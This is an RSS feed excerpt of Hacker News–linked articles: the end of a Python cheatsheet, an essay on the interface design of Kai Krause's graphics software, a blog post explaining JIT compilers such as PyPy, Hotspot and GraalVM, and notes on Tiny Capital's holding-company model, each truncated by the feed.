<span>'\w'</span> == <span>'[a-zA-Z0-9_]'</span>                         
<span>'\s'</span> == <span>'[ \t\n\r\f\v]'</span>                        
</code></pre></div>


<div><h2 id="format"><a href="#format" name="format">#</a>Format</h2><pre><code>&lt;str&gt; = <span>f'<span>{&lt;el_1&gt;}</span>, <span>{&lt;el_2&gt;}</span>'</span>
&lt;str&gt; = <span>'{}, {}'</span>.format(&lt;el_1&gt;, &lt;el_2&gt;)
</code></pre></div>

<div><h3 id="attributes">Attributes</h3><pre><code><span>&gt;&gt;&gt; </span><span>from</span> collections <span>import</span> namedtuple
<span>&gt;&gt;&gt; </span>Person = namedtuple(<span>'Person'</span>, <span>'name height'</span>)
<span>&gt;&gt;&gt; </span>person = Person(<span>'Jean-Luc'</span>, <span>187</span>)
<span>&gt;&gt;&gt; </span><span>f'<span>{person.height}</span>'</span>
<span>'187'</span>
<span>&gt;&gt;&gt; </span><span>'{p.height}'</span>.format(p=person)
<span>'187'</span>
</code></pre></div>

<div><h3 id="generaloptions">General Options</h3><pre><code>{&lt;el&gt;:&lt;<span>10</span>}                                     
{&lt;el&gt;:^<span>10</span>}                                     
{&lt;el&gt;:&gt;<span>10</span>}  …</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gto76.github.io/python-cheatsheet">https://gto76.github.io/python-cheatsheet</a></em></p>]]>
            </description>
            <link>https://gto76.github.io/python-cheatsheet</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739589</guid>
            <pubDate>Sun, 05 Jul 2020 15:53:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Interface of Kai Krause's Software]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739545">thread link</a>) | @bschne
<br/>
July 5, 2020 | https://www.mprove.de/script/99/kai/index.html | <a href="https://web.archive.org/web/*/https://www.mprove.de/script/99/kai/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
			<div>
				<div>
					<h2 skip="">Contents</h2>
					<ol>
						<li><a href="https://www.mprove.de/script/99/kai/index.html#history"><b>Meta-History</b></a></li>
						<li><a href="https://www.mprove.de/script/99/kai/index.html#software"><b>The Software</b></a>
							<ul>
								<li>Maximize the Interface</li>
								<li>Full Screen Mode</li>
								<li>Rooms</li>
								<li>Minimize the Interface</li>
								<li>The Desktop</li>
							</ul>
						</li>
						<li><a href="https://www.mprove.de/script/99/kai/index.html#interfacelanguage"><b>Kai’s Interface Language</b></a>
							<ul>
								<li>Unfolding functionality</li>
								<li>MouseOver</li>
								<li>MouseDragging instead of Value-Slider</li>
								<li>Memory Dots / Five Favorites</li>
								<li><nobr>Transparency &amp; Shadows (KPT Lens f/x, Poser</nobr><nobr>)</nobr></li>
								<li>Full Screen Mode, <a href="https://www.mprove.de/script/99/kai/index.html#rooms">Rooms Metaphor</a></li>
								<li>Workspace – Desktop</li>
								<li>MetaWindow</li>
							</ul>
						</li>
						<li><a href="https://www.mprove.de/script/99/kai/index.html#references"><b>References</b></a></li>
					</ol>
				</div>
			</div>
			<h2><a name="history" id="history"></a>Meta-History</h2>
			<h3>CV</h3>
			<p><a id="Truong97" name="Truong97"></a><strong><a href="https://en.wikipedia.org/wiki/Kai_Krause">Kai Krause</a></strong> [today: <a href="http://kai.sub.blue/">kai.sub.blue</a>]was born 1957 in Dortmund. He came to California in 1976 with two friends. He worked as a musician for <em>Disney Sound Effects</em>; <strike>the sound track for “Star Trek: The Movie” was created on his synthesizers</strike>*. <span>* In fact Kai won a Clio Award for his sound effects in a Star Wars radio spot.</span> <a href="https://en.wikipedia.org/wiki/Emerson,_Lake_&amp;_Powell">Emerson, Lake &amp; Powell</a> bought sound systems from him and he is still working with <a href="https://petergabriel.com/">Peter Gabriel</a> today in order to fulfill his vision of visualized music as 3D sculptures. [<a href="https://www.mprove.de/script/99/kai/index.html#refTruong97">Truong97</a>]</p>
			<p>He was running a forum for several years on AOL: <a href="https://www.mprove.de/script/90/KPT/index.html"><em>Kai’s Power Tips &amp; Tricks</em></a>. He gave people tips and little pieces of code on line, simply because they shared his passion for computer graphics. This became an extensive and valuable collection of practical information how to get special effects with <em>Adobe Photoshop</em>. It can still be downloaded from several web sites. [<a id="KaiTT" name="KaiTT" href="https://www.mprove.de/script/99/kai/index.html#refKaiTT">KaiTT</a>]</p>
			<h3>The Company</h3>
			<p><img src="https://www.mprove.de/script/99/kai/_media/high/history.jpg" height="441" width="803"></p>
			<p>Fig. 1 Timeline with companies and products</p>
			<p><em>Harward Systems Corporation</em> (HSC Software Corp.) [also <em>Happy Software Company</em>] was founded by John Wilczak. Ben Weiss and Kai joined him in 1991 at HSC and created the first version of <em>Kai’s Power Tools</em>. KPT is a set of plug-ins that use the Adobe Photoshop programing interface for 3rd party filters. Many ideas from <a href="https://www.mprove.de/script/90/KPT/index.html">Kai’s Power Tips &amp; Tricks</a> get implemented as simple and easy to use pieces of software. KPT evolved until version 3 in 1995. This release contains the <em>Texture Explorer</em>, the <em>Spheroid Designer</em> and <em>KPT Lens f/x</em> among others. <em>Convolver</em> came out as a separate product. HSC was renamed to <em>MetaTools, Inc.</em> the same year.</p>
			<p>Eric Wenger and Phil Clevenger came into the team to develop a landscape-simulating product called <em>Bryce</em> (named after the <a href="https://www.nps.gov/brca/index.htm">Bryce Canyon</a>). They started creating other kinds of software starting with <em>Kai’s Power GOO</em>, <em>Kai’s Photo Soap</em> and <em>Kai’s Power Show</em>. Before GOO, Kai was well known only by computer artists as a creator of creative tools. With GOO, Kai became noticed by a much broader audience. People played with GOO. The complex and difficult algorithms are well hidden by the interface. Even children can change images of their classmates or teachers to funny caricatures. Kai himself calls this sort of computer programs <em>funware</em>.</p>
			<p>In 1998 Phil Clevenger and Kai managed to transfer the main interface concepts from Bryce to <em>Poser3</em>. Poser was originally created by <em>Fractal Design</em>. The companies MetaTools and Fractal Design merged in 1997. The new company was named <a href="https://en.wikipedia.org/wiki/MetaCreations"><em>MetaCreations Corp</em>.</a> In 1998 it had about 300 employees. The main office is in Santa Barbara, CA, but several other facilities e.g. in San Francisco, are part of MetaCreations. <a id="MCRE" name="MCRE"></a>[<a href="https://www.mprove.de/script/99/kai/index.html#refMCRE">MCRE</a>]</p>
			<h4>Update π-day 2018</h4>
			<ul>
				<li><a href="https://www.scribd.com/document/373825984/MataTools-Flyer-1996">MetaTools Flyer 1996</a></li>
				<li><a href="http://vv.arts.ucla.edu/teaching/software/lifeintheuniverse/"><em>Life in the Universe (1997)</em></a> – <a href="http://victoriavesna.com/index.php?p=teaching&amp;item=2">course material by Victoria Vesna</a>, UCLA (Thanks to Christopher Cowan for sharing the link.)
					<ul>
						<li><a href="https://www.facebook.com/kaikemono/posts/10216470444058859" target="_blank"><strike>Some thoughts by the designer Kai Gradert</strike></a></li>
					</ul>
				</li>
			</ul>
			<h2><a name="software" id="software"></a>The Software</h2>
			<h3>Maximize the Interface</h3>
			<h4>Full Screen Mode</h4>
			<p><a id="Kai95-1" name="Kai95-1"></a>Kai describes how it came to the large dialogs in KPT3:</p>
			<blockquote>
				<p>»I would love to interact with the image in the way that Levels or Curves does, but the plug-in interface as of today simply will not allow it. What that leads to is simply that the plug-in gets a rectangle and is supposed to do something with the pixels in some other room and then give them back.« [<a href="https://www.mprove.de/script/99/kai/index.html#refKai95">Kai95</a>]</p>
			</blockquote>
			<p>Many of the filters in KPT3 like <em>KPT Texture Explorer</em>, <em>KPT Spheroid Designer</em> and <em>KPT Convolver</em> use a rectangular area that fits on a 14" monitor. All other elements get blacked out – no menu bar, no Photoshop image window and no desktop. The user experience is really like coming into a room with a special suited environment for one specific task.</p>
			<p><a name="Fig2 KPT Texture"></a><img src="https://www.mprove.de/script/99/kai/_media/high/KPT3TextureExplorer.jpg" height="460" width="640"></p>
			<p>Fig. 2 KPT Texture Explorer 3.0</p>
			<p>KPT Texture Explorer is a modal dialog, that is especially prepared to create textures and nothing else.</p>
			<p><img id="spheroiddesigner" src="https://www.mprove.de/script/99/kai/_media/high/KPT3SpheroidDesigner.jpg" name="spheroiddesigner"></p>
			<p>Fig. 3 KPT Spheroid Designer 3.0</p>
			<p>KPT Spheroid Designer is meant to create collections of special looking orbs. Different controls allow the definition of light or to select a special surface structure for the orbs. The KPT users manual notes that Spheroid Designer may seem to resemble glass balls dropped into mud, but actually it’s meant to be glass balls embedded in an “old stale brownie”. [<a href="https://www.mprove.de/script/99/kai/index.html#refLombreglia97">Lombreglia97</a>]<br>
					<a id="kansei" name="kansei"></a></p>
			<p><a name="Fig4 KPT Convolver"></a><img id="convolver" src="https://www.mprove.de/script/99/kai/_media/high/KPTConvolver.jpg" name="convolver"></p>
			<p>Fig. 4 KPT Convolver</p>
			<p><a id="Tog96" name="Tog96"></a><a href="http://asktog.com/">Bruce “Tog” Tognazzini</a> writes about <em>Kansei Engineering</em>:</p>
			<blockquote>
				<p>»Since the year A.D. 618 the Japanese have been creating beautiful Zen gardens, environments of harmony designed to instill in their users a sense of serenity and peace. […] Every rock and tree is thoughtfully placed in patterns that are at once random and yet teeming with order. Rocks are not just strewn about; they are carefully arranged in odd-numbered groupings and sunk into the ground to give the illusion of age and stability. Waterfalls are not simply lined with interesting rocks; they are tuned to create just the right burble and plop. […]<br>
					
					Kansei speakes to a totality of experience: colors, sounds, shapes, tactile sensations, and kinesthesia, as well as the personality and consistency of interactions.« [<a href="https://www.mprove.de/script/99/kai/index.html#refTog96">Tog96</a>, pp. 171]</p>
			</blockquote>
			<p>Then Tog comes to software design:</p>
			<blockquote>
				<p>»Where does kansei start? Not with the hardware. Not with the software either. Kansei starts with attitude, as does quality. The original <a href="https://www.mprove.de/visionreality/text/3.1.6_xeroxstar.html">Xerox Star</a> team had it. So did the <a href="https://www.mprove.de/visionreality/text/3.1.8_lisa.html">Lisa</a> team, and the <a href="https://www.mprove.de/visionreality/text/3.1.9_macintosh.html">Mac</a> team after. All were dedicated to building a single, tightly integrated environment – a totality of experience. […]<br>
					KPT Convolver […] is a marvelous example of kansei design. It replaces the extensive lineup of filters that graphic designers traditionally grapple with when using such tools as Photoshop with a simple, integrated, harmonious environment.<br>
					In the past, designers have followed a process of picturing their desired end result in their mind, then applying a series of filters sequentially, without benefit of undo beyond the last-applied filter. Convolver lets users play, trying any combination of filters at will, either on their own or with the computer’s aid and advice. […] Both time and space lie at the user’s complete control.« [<a href="https://www.mprove.de/script/99/kai/index.html#refTog96">Tog96</a>, pp. 174]</p>
			</blockquote>
			<p>Many of the interface ideas evolved from <em>KPT</em> into <em>Bryce</em>. It is a whole environment that covers the complete screen. It overcomes the limitation of a fixed 14" rectangle, because the interface scales itself to the according screen dimensions. The same holds for <em>Poser3</em> and <em>KPT5</em> as they were shipped late in 1998.</p>
			<p><img id="bryce" src="https://www.mprove.de/script/99/kai/_media/high/bryce_full.jpg" name="bryce"></p>
			<p>Fig. 5 Bryce 2</p>
			<h4><a id="rooms" name="rooms"></a><a name="Lombreglia97"></a>Rooms</h4>
			<blockquote>
				<p>»The writer <a href="https://en.wikipedia.org/wiki/John_Updike">John Updike</a> is said to have several different writing rooms in his home, each used for a different kind of work -- a fiction room, a poetry room, a room for writing essays and book reviews. All writers want a special room for working (with door, without telephone), but why would any writer -- even such a deservedly successful and prosperous one as John Updike -- need entirely different rooms for different kinds of writing?<br>
					Actually, I know exactly why. Mr. Updike’s arrangement sounded great to me the first time I heard about it. I’m sure working in those rooms is his way of staying inspired, fighting boredom and distraction, getting creative work done by being in a space that’s not only set aside for work but that also somehow provokes that work, probably in quite subtle ways.« [<a href="https://www.mprove.de/script/99/kai/index.html#refLombreglia97">Lombreglia97</a>]</p>
			</blockquote>
			<p><a name="Fig6 GOO"></a><img id="goo" src="https://www.mprove.de/script/99/kai/_media/high/GOO.jpg" name="goo"></p>
			<p>Fig. 6 Kai’s Power GOO</p>
			<p>The <em>GOO room</em> is a specialized environment for shifting pixels around. But because Kai’s Power GOO is one of the first stand-alone applications from MetaTools some operating systems tasks like opening and closing images need to be accessible within the application. In order not to clutter the room that is special suited to edit the image, other rooms become part of the application. <span><a href="http://www.macworld.com/article/3005783/software-graphics/an-ode-to-kais-power-goo.html"><span>cf. An ode to Kai’s Power Goo, Macworld 11/2015</span></a></span> E.g. <em>Kai’s Photo Soap</em> (Fig. 7) initially presents you with a series of seven “rooms” – In, Prep, Tone, Color, Detail, Finishing and Out – which one can enter to perform particular tasks.</p>
			<p><img id="soap-rooms" src="https://www.mprove.de/script/99/kai/_media/high/SoapRooms.jpg" name="soap-rooms"></p>
			<p>Fig. 7 Plan-Room in Kai’s Photo Soap</p>
			<h3><a id="Bier93" name="Bier93"></a>Minimize the Interface</h3>
			<p>The concept of Magic Lenses was introduced by [<a href="https://www.mprove.de/script/99/kai/index.html#refBier93">Bier et al. 93</a>]. Two years later Kai designed a tool for KPT3 that can be dragged on top of an image. A circled look-through area shows a preview of the selected filter attributes.</p>
			<p><img id="lens" src="https://www.mprove.de/script/99/kai/_media/high/KPTLens.jpg" name="lens"></p>
			<p>Fig. 8 KPT Lens f/x 3.0 on top of a Photoshop image window</p>
			<p><a name="Kai95-2"></a>Kai himself describes the design concept that lead to the lens tool in KPT3:</p>
			<blockquote>
				<p>»What is called the “lenses” was in alpha known as the Dragon, as in “drag-on-the-image” and its design concept was so simple: make a precision instrument, like a little Swiss Army knife or a watch or microscope (it was also known as the fx Scope…) which has just a few very tiny controls around a center window. In this window a number of effects could be shown exactly as they would appear, over the real image, and updated in realtime.<br>
					It’s a lovely idea to keep all kinds of options hidden inside little wheels and dials that pop out to set and hide themselves during use… I think we have barely begun to use all the possibilities of that. And the actual interaction with the screen image is still a little clunky, hampered by the very illegality of bypassing the plug-in interface altogether.« [<a href="https://www.mprove.de/script/99/kai/index.html#refKai95">Kai95</a>]</p>
			</blockquote>
			<p>Soap is the consequent next step into this direction. The tools no longer need to be modal like the KPT lens; they can be used in a very natural modeless manner. Pens, brushes and erasers are distributed all over the workspace. They are large, they cast <strike>real</strike> virtual shadows, and the tips of the tools get pressed down while they are in use.</p>
			<p><img id="soap" src="https://www.mprove.de/script/99/kai/_media/high/Soap.jpg" name="soap" height="500" width="776"></p>
			<p>Fig. 9 …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mprove.de/script/99/kai/index.html">https://www.mprove.de/script/99/kai/index.html</a></em></p>]]>
            </description>
            <link>https://www.mprove.de/script/99/kai/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739545</guid>
            <pubDate>Sun, 05 Jul 2020 15:47:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Understand Things]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739474">thread link</a>) | @nqureshi
<br/>
July 5, 2020 | https://nabeelqu.co/understanding | <a href="https://web.archive.org/web/*/https://nabeelqu.co/understanding">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://nabeelqu.co/understanding</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739474</guid>
            <pubDate>Sun, 05 Jul 2020 15:38:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[JIT Compilers Are Implemented and Fast: Julia, PyPy, LuaJIT, Graal and More]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 4 (<a href="https://news.ycombinator.com/item?id=23739416">thread link</a>) | @kipply
<br/>
July 5, 2020 | https://carolchen.me/blog/jits-impls/ | <a href="https://web.archive.org/web/*/https://carolchen.me/blog/jits-impls/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <header>
    
    
  </header>

  <main id="main">
    
<article>
  <header>
    
    
  </header>
  <section id="js-article">
    
<p>This post goes into details of 5+ JITs and various optimization strategies and discuss how they work with different JITs. Information in this blog post is more <em>depth-first</em>, thus there are many important concepts that may be skipped.</p>
<p>For background on JIT compilers see <a href="https://carolchen.me/blog/jits-intro">A Deep Introduction to JIT Compilers: JITs are not very Just-in-time</a>. If the title does not make sense to you then it may be worth a skim. </p>
<blockquote>
<p><em>Mild Disclaimers, can be skipped</em>.</p>
</blockquote>
<blockquote>
<p>I will often describe an optimization behaviour and claim that it probably exists in some other compiler. Though I don't always check if an optimization exists in another JIT (it's sometimes ambiguous), I'll always state explicitly if I know it’s there. 
I will also provide code examples to show where an optimization might occur, however the optimization may not necessarily occur for that code because another optimization will take precedence. There may also be some general oversimplifications, but not more than I think exists in most posts like these. </p>
</blockquote>
<h2 id="table-of-contents-highlights">Table of Contents / Highlights<a href="#table-of-contents-highlights" aria-label="Anchor link for: table-of-contents-highlights"> <i></i></a>
</h2>
<ul>
<li><a href="https://carolchen.me/blog/jits-impls/#wait-but-you-said-meta-tracing">Meta-tracing in Pypy works</a></li>
<li><a href="https://carolchen.me/blog/jits-impls/#interpreting-c">How GraalVM languages support C extensions</a></li>
<li><a href="https://carolchen.me/blog/jits-impls/#go-back-to-the-interpreted-code-it-ll-be-faster">Deoptimisation</a></li>
<li><a href="https://carolchen.me/blog/jits-impls/#wet-code-is-fast-code-inlining-and-osr">Inlining and OSR</a></li>
<li><a href="https://carolchen.me/blog/jits-impls/#what-if-instead-of-instruction-based-ir-like-everyone-else-we-had-a-big-graph-and-also-it-modifies-itself">Seas of Nodes</a></li>
<li><a href="https://carolchen.me/blog/jits-impls/#yay-jit-compiled-code-let-s-compile-it-again-and-again">Tiering JITs</a></li>
</ul>

<p>LuaJIT employs a method called tracing. Pypy does meta-tracing, which involves using a system to generate tracing interpreters and JITs. Pypy and LuaJIT are not the reference implementations of Python or Lua, but a projects on their own. I would describe LuaJIT as shockingly fast, and it describes itself as one of the fastest dynamic language implementations -- which I buy fully.</p>
<p>To determine when to start tracing, the interpreting loop will look for "hot" loops to trace (the concept of "hot" code is universal to JITS!). Then, the compiler will "trace" the loop, recording executed operations to compile well optimized machine code. In LuaJIT, the compilation is performed on the traces with an instruction-like IR that is unique to LuaJIT. </p>
<h3 id="how-pypy-implements-tracing"><strong>How Pypy Implements Tracing</strong><a href="#how-pypy-implements-tracing" aria-label="Anchor link for: how-pypy-implements-tracing"> <i></i></a>
</h3>
<p>Pypy will start tracing a function after 1619 executions, and will compile it after another 1039 executions, meaning a function has to execute around 3000 times for it to start gaining speed. These constants were carefully tuned by the Pypy team (lots of constants are tuned for compilers in general!).</p>
<p>Dynamic languages make it hard to optimize things away. The following code could be statically eliminated by a stricter language, as <code>False</code> will always be falsy. However, in Python 2, that could not have been guaranteed before runtime.</p>
<pre><code><span>if </span><span>False</span><span>:
  </span><span>print</span><span>(</span><span>"FALSE"</span><span>)
</span></code></pre>
<p>For any sane program, the conditional will always be false. Unfortunately, the value of <code>False</code> could be reassigned and thus if the statement were in a loop, it could be redefined somewhere else. For this case, Pypy would build a "guard". When a guard fails, the JIT will fall back to the interpreting loop. Pypy then uses another constant (200), called <em>trace eagerness</em> to decide whether to compile the rest of the new path till the end of the loop. That sub-path is called a <em>bridge</em>.</p>
<p>Pypy also exposes all those constants as arguments that can be tweaked at execution, along with configuration for unrolling (expanding loops) and inlining! It also exposes some hooks so we can see when things are compiled. </p>
<pre><code><span>def </span><span>print_compiler_info</span><span>(</span><span>i</span><span>):
  </span><span>print</span><span>(i</span><span>.</span><span>type)
pypyjit</span><span>.</span><span>set_compile_hook</span><span>(print_compiler_info)

</span><span>for </span><span>i </span><span>in </span><span>range</span><span>(</span><span>10000</span><span>):
  </span><span>if </span><span>False</span><span>:
    </span><span>pass

</span><span>print</span><span>(pypyjit</span><span>.</span><span>get_stats_snapshot</span><span>()</span><span>.</span><span>counters)
</span></code></pre>
<p>Above, I set up a plain python program with a compile hook to print the type of compilation made. It also prints some data at the end, where I can see the number of guards. For the above I get one compilation of a loop and 66 guards. When I replaced the if statement with just a pass under the for-loop, I was left with 59 guards.</p>
<pre><code><span>for </span><span>i </span><span>in </span><span>range</span><span>(</span><span>10000</span><span>):
  </span><span>pass </span><span># removing the `if False` saved 7 guards!
</span></code></pre>
<p>With these two lines added to the for loop, I will get two compilations, with the new one being of type 'bridge'!</p>
<pre><code><span>if </span><span>random</span><span>.</span><span>randint</span><span>(</span><span>1</span><span>, </span><span>100</span><span>) </span><span>&lt; </span><span>20</span><span>:
  </span><span>False </span><span>= </span><span>True
</span></code></pre><h3 id="wait-but-you-said-meta-tracing">Wait, but you said Meta-tracing!<a href="#wait-but-you-said-meta-tracing" aria-label="Anchor link for: wait-but-you-said-meta-tracing"> <i></i></a>
</h3>
<p>The concept behind meta-tracing is “write an interpreter, get a compiler for free!” or more magically, “turn your interpreter into a JIT-compiler!”. This is just obviously a great thing, since writing compilers is hard so if we can get a great compiler for free that’s just a good deal. Pypy "has" an interpreter and a compiler, but there’s no explicit implementation of a traditional compiler.</p>
<p>Pypy has a toolchain called RPython (which was built for Pypy). It is a framework program for implementing interpreters. It is a language in that it specifies a subset of the Python language, namely to force things like static typing. It is a language to write an interpreter in. It is not a language to code in typed-Python, since it doesn’t care or have things like standard libraries or packages. Any RPython program is a valid Python program. RPython programs are transpiled to C and then compiled. Thus, the RPython meta-compiler exists as a compiled C program.</p>
<p>The “meta” in meta-tracing comes from the fact that the trace is on the execution of the interpreter rather than the execution of the program. The interpreter more or less behaves as any interpreter, with the added capability of tracing its own operations, and being engineered to optimize those traces by updating the path of the interpreter (itself). With further tracing, the path that the interpreter takes becomes more optimized. With a very optimized interpreter taking a specific, optimized path, the compiled machine code being used in that path from the compiled RPython can be used as the compilation. </p>
<p>In short, the “compiler” in Pypy is compiling your interpreter, which is why Pypy is sometimes referred to as a meta-compiler. The compiler is less for the program you're trying to execute, but rather for compiling the trace of the optimizing interpreter!</p>
<p>Metatracing might be confusing, so I wrote a very bad metatracing program that can only understand <code>a = 0</code> and <code>a++</code>to illustrate.</p>
<pre><code><span># interpreter written with RPython
</span><span>for </span><span>line </span><span>in </span><span>code:
  </span><span>if </span><span>line </span><span>== </span><span>"a = 0"</span><span>:
    </span><span>alloc</span><span>(a, </span><span>0</span><span>)
  </span><span>elif </span><span>line </span><span>== </span><span>"a++"</span><span>:
    </span><span>guard</span><span>(a, </span><span>"is_int"</span><span>) </span><span># notice how in Python, the type is unknown, but after being interpreted by RPython, the type is known
    </span><span>guard</span><span>(a, </span><span>"&gt; 0"</span><span>)
    </span><span>int_add</span><span>(a, </span><span>1</span><span>)
</span></code></pre>
<p>If I ran the following in a hot loop;</p>
<pre><code><span>a </span><span>= </span><span>0
</span><span>a</span><span>++
</span><span>a</span><span>++
</span></code></pre>
<p>Then the traces may look something like:</p>
<pre><code><span># Trace from numerous logs of the hot loop
</span><span>a </span><span>= </span><span>alloc</span><span>(</span><span>0</span><span>) </span><span># guards can go away
</span><span>a </span><span>= </span><span>int_add</span><span>(a, </span><span>1</span><span>)
a </span><span>= </span><span>int_add</span><span>(a, </span><span>2</span><span>)

</span><span># optimize trace to be compiled
</span><span>a </span><span>= </span><span>alloc</span><span>(</span><span>2</span><span>) </span><span># the section of code that executes this trace _is_ the compiled code
</span></code></pre>
<p>But the compiler isn't some special standalone unit, it's built into the interpreter! So the interpreter loop would actually look something like this</p>
<pre><code><span>for </span><span>line </span><span>in </span><span>code:
  </span><span>if </span><span>traces</span><span>.</span><span>is_compiled</span><span>(line):
    </span><span>run_compiled</span><span>(traces</span><span>.</span><span>compiled</span><span>(line))
    </span><span>continue
  elif </span><span>traces</span><span>.</span><span>is_optimized</span><span>(line):
    </span><span>compile</span><span>(traces</span><span>.</span><span>optimized</span><span>(line))
      </span><span>continue
  elif </span><span>line </span><span>== </span><span>"a = 0"
  </span><span># ....
</span></code></pre><h2 id="an-introduction-to-jvms">An Introduction to JVMs<a href="#an-introduction-to-jvms" aria-label="Anchor link for: an-introduction-to-jvms"> <i></i></a>
</h2>
<p>Disclaimer: I worked on/with a Graal-based language, <a href="https://github.com/oracle/truffleruby">TruffleRuby</a> for four months and loved it.</p>
<p>Hotspot (named after looking for <em>hot</em> spots) is the VM that ships with standard installations of Java, and there are actually multiple compilers in it for a tiered strategy. Hotspot is open source, with 250,000 lines of code which contains the compilers, and three garbage collectors. It does an <em>awesome</em> job at being a good JIT, there are some benchmarks that have Hotspot on par with C++ impls (oh my gosh so many asterisks on this, you can Google to find all the debate). Though Hotspot is not a tracing JIT, it employs a similar approach of having an interpreter, profiling and then compiling. There is not a specific name for what Hotspot does, though the closest categorization would probably be a Tiering JIT. </p>
<p>Strategies used in Hotspot inspired many of the subsequent JITs, the structure of language VMs and especially the development of Javascript engines. It also created a wave of JVM languages such as Scala, Kotlin, JRuby or Jython. JRuby and Jython are fun implementations of Ruby and Python that compile the source code down to the JVM bytecode and then have Hotspot execute it. These projects have been relatively successful at speeding up languages like Python and Ruby (Ruby more so than Python) without having to implement an entire toolchain like Pypy did. Hotspot is also unique in that it's a JIT for a less dynamic language (though it's technically it's a JIT for JVM bytecode and not Java). </p>
<p><img src="https://carolchen.me/blog/img/jits/vms.png" alt=""></p>
<p>GraalVM is a JavaVM and then some, written in Java. It can run any JVM language (Java, Scala, Kotlin, etc). It also supports a Native Image, to allow AOT compiled code through something called Substrate VM. Twitter runs a significant portion of their Scala services with Graal, so it must be pretty good, and better than the JVM in some ways despite being written in Java. </p>
<p>But wait, there's more! GraalVM also provides Truffle, a framework for implementing languages through building Abstract Syntax Tree (AST) interpreters. With Truffle, there’s no explicit step where JVM bytecode is created as with a conventional JVM language, rather Truffle will just use the interpreter and communicate with Graal to create machine code directly with profiling and a technique called partial evaluation. Partial evaluation is out of scope for this blog post, tl;dr it follows metatracing’s “write an interpreter, get a compiler for free” philosophy but is approached differently.</p>
<blockquote>
<p>TruffleJS, the Truffle implementation of Javascript outperforms the JavaScript V8 engine on select benchmarks which is really impressive since V8 has had numerous more years of development, Google money+resources poured in and some crazy skilled people working on it. TruffleJS is still by no means “better” than V8 (or other JS engines) on most measures but it is a sign of promise for Graal. </p>
</blockquote>

<h3 id="interpreting-c">Interpreting C<a href="#interpreting-c" aria-label="Anchor link for: interpreting-c"> <i></i></a>
</h3>
<p>A common problem with JIT implementations is support for C Extensions. Standard interpreters such …</p></section></article></main></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://carolchen.me/blog/jits-impls/">https://carolchen.me/blog/jits-impls/</a></em></p>]]>
            </description>
            <link>https://carolchen.me/blog/jits-impls/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739416</guid>
            <pubDate>Sun, 05 Jul 2020 15:31:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Andrew Wilkinson and Tiny Capital]]>
            </title>
            <description>
<![CDATA[
Score 77 | Comments 16 (<a href="https://news.ycombinator.com/item?id=23739381">thread link</a>) | @colinkeeley
<br/>
July 5, 2020 | https://colinkeeley.com/blog/andrew-wilkinson-tiny-capital-operating-manual | <a href="https://web.archive.org/web/*/https://colinkeeley.com/blog/andrew-wilkinson-tiny-capital-operating-manual">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-db1d94e86a488296a48d"><div><blockquote><p><em>“Let someone else run the marathon and incentivize them.”&nbsp;</em></p><p><em>-Andrew Wilkinson</em></p></blockquote><p><strong>What is Tiny?</strong></p><p><a href="http://tinycapital.com/">Tiny</a>&nbsp;is a long term holding company for internet businesses started by&nbsp;<a href="https://twitter.com/awilkinson">Andrew Wilkinson</a>&nbsp;and&nbsp;<a href="https://twitter.com/_sparling_?lang=en">Chris Sparling</a>. They take majority, generally whole, stakes in "profitable, simple, and often boring” internet businesses.&nbsp;</p><p><strong>Why are holding companies and micro private equity interesting?&nbsp;</strong></p><p>I suspect this is the most dependable way to become very wealthy. It isn’t as glamorous or as quick (potentially) as founding or investing in the next multi-billion dollar startup. This is a longer-term grind it out approach.&nbsp;</p><p>Starting companies is fun, but anyone who has done it knows it is a lot of work. Buying established businesses with existing cash flow isn’t as sexy so I suspect it is wildly underrated as a way of building wealth.&nbsp;</p><p>The reality is that it is easier to buy and improve businesses than to start them. It is easier to go from 3 to 10 than from 0 to 1. Even for the folks that have done it before.&nbsp;</p><p>There isn’t much info on how holding companies or micro-PEs like Tiny actually operate. I’ve listened to every podcast Andrew has been on and compiled these notes from them.&nbsp;</p><p>Here is what they are doing behind the scenes.</p><p><strong>How Andrew got started? Where the capital comes from?</strong></p><p>In 2006, Andrew founded&nbsp;<a href="http://metalab.co/">MetaLab</a>, a Victoria, Canada-based design agency shortly after high school. After rapid growth, he used the profits to diversify into a variety of businesses, which today form Tiny, a holding company he owns fully with his business partner Chris Sparling.&nbsp;</p><p>Agencies traditionally aren’t very profitable, but MetaLab is able to charge San Francisco agency rates and only pay Victoria, Canada wages.&nbsp;</p><p>Tiny shifted its focus from starting businesses to buying them in 2013 when MetaLab and all their other businesses combined were doing $7M/year in profit. Tiny is fully self-funded today.</p><p><strong>What’s the scale of Tiny now?</strong></p><p>Comfortably not tiny. It sounds like somewhere around $80-95M revenue per year (double-digit millions is what Andrew says) with highly profitable businesses. They have around 350-400 employees across 20ish companies.&nbsp;</p><p><strong>What Tiny looks for in businesses to buy?</strong></p><p>From their site:</p><blockquote><p><em>3-5+ years of operating history</em></p><p><em>Profits. A minimum $500k/year in annual profit, as high as $15MM.</em></p><p><em>A high-quality team in place. This is negotiable if the business is simple to operate and the team wants to leave.</em></p><p><em>We are open to owners sticking around, leaving cold turkey, or transitioning out over time. We'll work with you to transition.</em></p><p><em>Simple internet businesses that have high margins, don't require tons of people or complex technology, and have a competitive advantage that protects them from competitors. For example: A dominant brand, a large and loyal community, a niche vertical, or something similar.</em></p></blockquote><p>Andrew describes these businesses as "New Zealand companies.”</p><p>What is a New 